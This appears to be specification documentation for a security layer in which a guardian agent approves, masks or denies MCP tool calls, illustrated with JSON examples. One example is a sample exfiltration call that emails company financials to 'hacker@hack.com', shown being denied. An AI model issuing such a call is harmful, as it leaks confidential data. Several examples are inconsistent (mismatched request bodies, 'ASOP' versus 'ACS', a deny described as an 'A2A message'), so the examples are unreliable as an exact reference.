# Extending MCP

## MCP protocol
The Model Context Protocol ([MCP](https://modelcontextprotocol.io/introduction)) is an open standard that simplifies how AI models, particularly Large Language Models (LLMs) and agents, interact with external data sources, tools, and APIs. It's designed to provide a standardized way for AI agents to connect with the real world, making it easier to build AI applications that can access and use external information.<br><br>
MCP is gaining popularity world-wide and is being adopted and integrated almost everywhere, security and observability must be implemented to prevent unwanted bad consequences.<br>
In the same manner as ACS standardize security for non-standardize access and use of tools and data, it also extends MCP protocol to allow secure usage and implement security controls.

## MCP support

ACS extension for MCP is used as a **transport** for MCP communications between the agent and the guardian agent. Meaning ACS understands and delivers MCP message as is.<br>
Securing MCP means securing outbound and inbound communications/messages from the agent (using MCP client) to the MCP server and vice versa.<br> 

#### To extend MCP protocol:
1. Agents using MCP ***must*** use ACS as a transport protocol to deliver MCP messages to the guardian agent using [`protocols/MCP/*`](hooks.md#protocolsmcp).
2. Agents using MCP ***must*** understand and enforce ACS responses.

#### The following flow explains how this should be done:
1. Agent **A** prepares (using MCP client) MCP-compliant message.
2. Agent **A** uses ACS as a transport to send the message to the guardian agent.
3. The guardian agent understands and processes the MCP transported message and send the result back to agent **A**.
4. Agent **A** interprets and enforces the response from guardian agent.
5. In case response is `allow`, agent **A** sends the MCP message to MCP server.
6. MCP server processes the message and sends back to agent **A** the response.
7. Agent **A** uses ACS as a transport to send the MCP response to the guardian agent.
8. The guardian agent understands and processes the MCP transported response and send the result back to agent **A**.
9. Agent **A** interprets and enforces the response from guardian agent.

## Examples
### Scenario: Agent **A** asks MCP server for the weather and guardian agent respond with allow
#### 1. Agent **A** prepares MCP `tools/call` message 

   ```json
   {
     "jsonrpc": "2.0",
     "id": 1,
     "method": "tools/call",
     "params": {
       "arguments": {
           "city": "Barcelona"
       },
       "name": "get_weather"
     }
   }
   ```

#### 2. Agent **A** uses ASOP as a transport and sends MCP `protocols/MCP` message 

   ```json
    {
        "jsonrpc": "2.0",
        "id": 70,
        "method": "protocols/MCP",
        "params": {
            "jsonrpc": "2.0",
            "id": 1,
            "method": "tools/call",
            "params": {
            "arguments": {
                "city": "Barcelona"
            },
            "name": "get_weather"
            }
        }
    }
   ```

#### 3. Guardian agent sends `allow` response to agent **A**

   ```json
        {
        "jsonrpc": "2.0",
        "id": 70,
        "result": {
            "decision": "allow",
            "message": "Allow tools/call.",
            "reasoning": "I understand that this is an MCP message. An agent is asking the weather. Nothing suspicious here."
        }
    }
   ```


### Scenario: Agent **A** asks MCP server for to send email with sensitive data and guardian agent respond with modify
#### 1. Agent **A** prepares MCP `tools/call` message 
   ```json
   {
     "jsonrpc": "2.0",
     "id": 1,
     "method": "tools/call",
     "params": {
       "arguments": {
           "to": "hr@company.io",
           "subject": "",
           "body": ""
       },
       "name": "send_email"
     }
   }
   ```

#### 2. Agent **A** uses ASOP as a transport and sends MCP `protocols/MCP` message
   ```json
    {
        "jsonrpc": "2.0",
        "id": 80,
        "method": "protocols/MCP",
        "params": {
            "jsonrpc": "2.0",
            "id": 1,
            "method": "tools/call",
            "params": {
            "arguments": {
                "to": "finance@company.io",
                "from": "manager@company.io",
                "subject": "Employee Salary Raise Request",
                "body": "Hi, I would like to ask for a salary raise for emplyee #12222. The current salary is 200000$, the requested salary is 300000$. Let's have a meeting discuss this."
            },
            "name": "send_email"
            }
        }
    }
   ```

#### 3. Guardian agent sends `modify` response to agent **A**
   ```json
        {
        "jsonrpc": "2.0",
        "id": 80,
        "result": {
            "decision": "modify",
            "message": "Modified data for tools/call.",
            "reasoning": "I understand that this is an MCP message. An agent is asking to send an email with sensitive info, I need to mask it first.",
            "modifiedRequest": {
                "jsonrpc": "2.0",
                "id": 80,
                "method": "protocols/MCP",
                "params": {
                    "jsonrpc": "2.0",
                    "id": 1,
                    "method": "tools/call",
                    "params": {
                    "arguments": {
                        "to": "finance@company.io",
                        "from": "manager@company.io",
                        "subject": "Employee Salary Raise Request",
                        "body": "Hi, I would like to ask for a salary raise for emplyee #12222. The current salary is **********$, the requested salary is **********$. Let's have a meeting discuss this."
                    },
                    "name": "send_email"
                    }
                }
            }
        }
    }
   ```


### Scenario: Agent **A** asks MCP server for to send email with sensitive data to an outsider and guardian agent respond with deny
#### 1. Agent **A** prepares MCP `tools/call` message 
   ```json
   {
     "jsonrpc": "2.0",
     "id": 1,
     "method": "tools/call",
     "params": {
       "arguments": {
           "to": "hacker@hack.com",
           "subject": "Financial info",
           "body": "The ARR for the company for year 2024 was 100000000000$ "
       },
       "name": "send_email"
     }
   }
   ```

#### 2. Agent **A** uses ASOP as a transport and sends MCP `protocols/MCP` message 
   ```json
   {
     "jsonrpc": "2.0",
     "id": 100,
     "method": "protocols/MCP",
     "params": {
        "jsonrpc": "2.0",
        "id": 1,
        "method": "tools/call",
        "params": {
        "arguments": {
            "to": "hacker@hack.com",
            "subject": "Financial info",
            "body": "The ARR for the company for year 2024 was 100000000000$ "
        },
        "name": "send_email"
        }
   }
   }
   ```

#### 3.Guardian agent sends `block` response to agent **A**
   ```json
    {
        "jsonrpc": "2.0",
        "id": 100,
        "result": {
            "decision": "deny",
            "message": "Deny message/send.",
            "reasoning": "This is A2A message. I recognize disallowed content."
        }
    }
   ```  
